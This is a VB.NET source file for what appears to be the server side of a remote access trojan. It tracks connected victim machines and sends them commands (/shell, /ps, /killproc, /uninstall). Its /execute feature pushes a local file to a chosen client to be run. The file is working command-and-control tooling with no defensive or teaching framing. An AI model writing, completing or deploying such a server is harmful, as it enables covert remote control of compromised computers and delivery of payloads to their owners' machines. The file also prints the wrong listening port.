Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading
Imports System.Security.Cryptography
Imports System.IO

Module ServerModule
    Private listener As TcpListener
    Private clients As New Dictionary(Of String, ClientInfo)
    Private clientCounter As Integer = 0
    Private serverRunning As Boolean = True
    Private ReadOnly clientListLock As New Object()
    Private inputPrompt As String = "Enter Client ID to chat or 'exit' to quit: "
    Private ReadOnly validCommands As HashSet(Of String) = New HashSet(Of String) From {"/shell", "/clear", "/ps", "/listprocs", "/killproc", "/close", "/uninstall"}
    Sub Main()
        StartServer()
    End Sub

    Private Sub StartServer()
        listener = New TcpListener(IPAddress.Any, 56560)
        listener.Start()
        Console.ForegroundColor = ConsoleColor.Green
        Console.WriteLine("Server started on port 8000")
        Console.ResetColor()

        Dim listenerThread As New Thread(AddressOf ListenForClients)
        listenerThread.Start()


        DisplayClients()
        While serverRunning

            Dim input As String = Console.ReadLine()
            If input.ToLower() = "exit" Then
                serverRunning = False
                listener.Stop()
            ElseIf clients.ContainsKey(input.ToUpper) Then
                ChatWithClient(input.ToUpper)
            Else
                Console.ForegroundColor = ConsoleColor.Red
                Console.WriteLine("Invalid Client ID.")
                Console.ResetColor()
            End If
        End While
    End Sub

    Private Sub ListenForClients()
        While serverRunning
            Try
                Dim client As TcpClient = listener.AcceptTcpClient()
                Dim clientId As String = GenerateClientId(client)
                Dim clientThread As New Thread(Sub() HandleClientCommunication(client, clientId))
                clientThread.Start()
            Catch ex As Exception

            End Try
        End While
    End Sub

    Private Function GenerateClientId(client As TcpClient) As String
        Dim ipAddress As String = DirectCast(client.Client.RemoteEndPoint, Net.IPEndPoint).Address.ToString()
        Dim clientIdHash As String = HashIpAddress(ipAddress)
        Return "C" & clientIdHash.Substring(0, 5)
    End Function

    Private Function HashIpAddress(ipAddress As String) As String
        Dim sha256 As New SHA256Managed()
        Dim bytes As Byte() = Encoding.UTF8.GetBytes(ipAddress)
        Dim hashBytes As Byte() = sha256.ComputeHash(bytes)
        Dim hashString As New StringBuilder()
        For Each b As Byte In hashBytes
            hashString.Append(b.ToString("X2"))
        Next
        Return hashString.ToString()
    End Function

    Private Sub HandleClientCommunication(client As TcpClient, clientId As String)
        Dim stream As NetworkStream = client.GetStream()
        Dim buffer(1024) As Byte
        Dim bytesRead As Integer = stream.Read(buffer, 0, buffer.Length)
        Dim clientOs As String = Encoding.ASCII.GetString(buffer, 0, bytesRead)

        Dim clientInfo As New ClientInfo With {
            .Id = clientId,
            .Client = client,
            .Ip = DirectCast(client.Client.RemoteEndPoint, IPEndPoint).Address.ToString(),
            .OperatingSystem = clientOs
        }

        SyncLock clientListLock
            clients(clientId) = clientInfo
        End SyncLock

        Console.ForegroundColor = ConsoleColor.Yellow
        Console.WriteLine($"Client connected: {clientId}, IP: {clientInfo.Ip}, OS: {clientInfo.OperatingSystem}")
        Console.ResetColor()
        DisplayClients()

        While client.Connected
            Try
                bytesRead = stream.Read(buffer, 0, buffer.Length)
                If bytesRead > 0 Then
                    Dim message As String = Encoding.ASCII.GetString(buffer, 0, bytesRead)
                    Console.ForegroundColor = ConsoleColor.Cyan
                    Console.WriteLine($"{clientId}: {message}")
                    Console.ResetColor()
                End If
            Catch ex As Exception
                Exit While
            End Try
        End While

        SyncLock clientListLock
            clients.Remove(clientId)
        End SyncLock

        Console.ForegroundColor = ConsoleColor.Red
        Console.WriteLine($"Client disconnected: {clientId}")
        Console.ResetColor()
        DisplayClients()
    End Sub

    Private Sub DisplayClients()
        SyncLock clientListLock
            Console.Clear()
            Console.ForegroundColor = ConsoleColor.Green
            Console.WriteLine("Connected Clients:")
            For Each clientInfo As ClientInfo In clients.Values
                Console.WriteLine($"{clientInfo.Id} - {clientInfo.Ip} - {clientInfo.OperatingSystem}")
            Next
            Console.WriteLine()
            Console.ResetColor()
            Console.Write(inputPrompt)
        End SyncLock
    End Sub

    Private Sub ChatWithClient(clientId As String)
        Dim clientInfo As ClientInfo = clients(clientId)
        Dim stream As NetworkStream = clientInfo.Client.GetStream()

        Console.Clear()
        Console.ForegroundColor = ConsoleColor.Magenta
        Console.WriteLine($"Chatting with {clientId}. Type '/exit' to return to the client list.")
        Console.ResetColor()
        While True
            Dim message As String = Console.ReadLine()
            If message.ToLower() = "/exit" Then
                Exit While
            ElseIf message.ToLower() = "/clear" Then
                Console.Clear()
                Console.WriteLine($"Chatting with {clientId}. Type '/exit' to return to the client list.")
            ElseIf message.ToLower() = "/help" Then
                Console.WriteLine("Valid Commands:")
                Console.WriteLine("/Shell")
                Console.WriteLine("/PS")
                Console.WriteLine("/Listproc")
                Console.WriteLine("/Killproc")
            ElseIf message.ToLower().StartsWith("/execute") Then
                ProcessExecuteCommand(message, clientId)
            ElseIf message.StartsWith("/") Then
                ' Validate command
                Dim commandParts As String() = message.Split(" "c, 2)
                If Not validCommands.Contains(commandParts(0).ToLower()) Then
                    Console.WriteLine("Invalid command.")
                    Continue While
                End If
            End If

            Dim buffer() As Byte = Encoding.ASCII.GetBytes(message)
            stream.Write(buffer, 0, buffer.Length)
            Console.ForegroundColor = ConsoleColor.Magenta
            Console.WriteLine($"Server: {message}")
            Console.ResetColor()
        End While
        DisplayClients()
    End Sub

    Private Sub ProcessExecuteCommand(message As String, clientId As String)
        Dim commandParts As String() = message.Split(" "c, 2)
        If commandParts.Length = 2 Then
            Dim filePath As String = commandParts(1)

            If File.Exists(filePath) Then

                SendFileToClient(filePath, clientId)
            Else
                Console.WriteLine("File not found: " & filePath)
            End If
        Else
            Console.WriteLine("Usage: /execute {path}")
        End If
    End Sub

    Private Sub SendFileToClient(filePath As String, clientId As String)
        Try
            If File.Exists(filePath) Then
                Dim fileName As String = Path.GetFileName(filePath)
                Dim fileContent As Byte() = File.ReadAllBytes(filePath)
                Dim executeCommand As String = $"/execute {fileName}"
                Dim executeCommandBytes As Byte() = Encoding.ASCII.GetBytes(executeCommand)


                Dim dataToSend As Byte() = executeCommandBytes.Concat(fileContent).ToArray()


                Dim clientInfo As ClientInfo = clients(clientId)


                Dim stream As NetworkStream = clientInfo.Client.GetStream()


                stream.Write(dataToSend, 0, dataToSend.Length)

                Console.WriteLine($"Sent file '{fileName}' to client '{clientId}'")
            Else
                Console.WriteLine("File not found: " & filePath)
            End If
        Catch ex As Exception
            Console.WriteLine("Error sending file: " & ex.Message)
        End Try
    End Sub







    Private Class ClientInfo
        Public Property Id As String
        Public Property Client As TcpClient
        Public Property Ip As String
        Public Property OperatingSystem As String
    End Class
End Module
